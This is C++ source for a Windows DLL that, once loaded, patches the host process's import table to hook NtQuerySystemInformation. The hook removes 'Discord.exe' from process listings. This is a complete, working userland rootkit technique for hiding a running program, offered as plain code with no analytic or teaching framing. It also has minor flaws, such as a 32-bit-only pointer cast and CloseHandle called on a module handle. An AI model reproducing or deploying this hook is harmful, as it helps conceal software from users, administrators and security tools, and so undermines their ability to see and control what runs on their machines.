#include "hook.h"

NTSTATUS __stdcall Hook::HookedNtQuerySystemInformation(
	__in		SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout		PVOID SystemInformation,
	__in		ULONG SystemInformationLength,
	__out_opt	PULONG ReturnLength
)
{
	NTSTATUS n_status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation,
		SystemInformationLength, ReturnLength);

	if (SystemProcessInformation == SystemInformationClass && n_status == STATUS_SUCCESS) {
		PNT_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
		PNT_SYSTEM_PROCESS_INFORMATION pNext = reinterpret_cast<PNT_SYSTEM_PROCESS_INFORMATION>(SystemInformation);

		do {
			pCurrent = pNext;
			pNext = reinterpret_cast<PNT_SYSTEM_PROCESS_INFORMATION>(reinterpret_cast<PUCHAR>(pCurrent) + pCurrent->NextEntryOffset);
			if (!wcsncmp(pNext->ImageName.Buffer, L"Discord.exe", pNext->ImageName.Length)) {
				if (!pNext->NextEntryOffset) {
					pCurrent->NextEntryOffset = 0;
				}
				else {
					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
				}
				pNext = pCurrent;
			}
		} while (pCurrent->NextEntryOffset != 0);
	}
	return n_status;
}

void Hook::Win32ExecuteHook()
{
	MODULEINFO modInfo = { 0 };
	HMODULE hModule = GetModuleHandle(DEF_SUCCESS_CODE_STANDARD);

	if (!GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO))) {
		return;
	}

	LPBYTE pAddress = reinterpret_cast<LPBYTE>(modInfo.lpBaseOfDll);
	PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pAddress);
	// Parse the PE header until we get to the info about imports (functions, and libs)
	PIMAGE_NT_HEADERS pNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(pAddress + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = reinterpret_cast<PIMAGE_OPTIONAL_HEADER>(&pNtHeader->OptionalHeader);
	// gather the imports
	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(pAddress +
		pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	// Loop through all the imports...looking to find ntdll.dll
	// Inside ntdll contains the function we are trying to hook
	for (; pImportDescriptor->Characteristics; pImportDescriptor++) {
		if (!strcmp("ntdll.dll", (PCHAR)(pAddress + pImportDescriptor->Name))) {
			break;
		}
	}

	PIMAGE_THUNK_DATA pOriginalThunkData = reinterpret_cast<PIMAGE_THUNK_DATA>(pAddress + pImportDescriptor->OriginalFirstThunk);
	PIMAGE_THUNK_DATA pFirstThunkData = reinterpret_cast<PIMAGE_THUNK_DATA>(pAddress + pImportDescriptor->FirstThunk);

	// Loop through the functions in the thunk data to find NtQuerySystemInformation
	for (; !(pOriginalThunkData->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pOriginalThunkData->u1.AddressOfData;
		pOriginalThunkData++) {

		PIMAGE_IMPORT_BY_NAME pImportByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(pAddress + pOriginalThunkData->u1.AddressOfData);
		if (!strcmp("NtQuerySystemInformation", (PCHAR)pImportByName->Name)) {
			break;
		}
		pFirstThunkData++;
	}

	DWORD dwOldPerms = NULL;
	VirtualProtect(reinterpret_cast<LPVOID>(&pFirstThunkData->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOldPerms);
	// Write the address of our hooked function into this virtual memory space
	pFirstThunkData->u1.Function = (DWORD)Hook::HookedNtQuerySystemInformation;
	VirtualProtect(reinterpret_cast<LPVOID>(&pFirstThunkData->u1.Function), sizeof(DWORD), dwOldPerms, NULL);

	CloseHandle(hModule);

}

BOOL __stdcall DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		Hook::Win32ExecuteHook();
		break;
	}
	return TRUE;
}

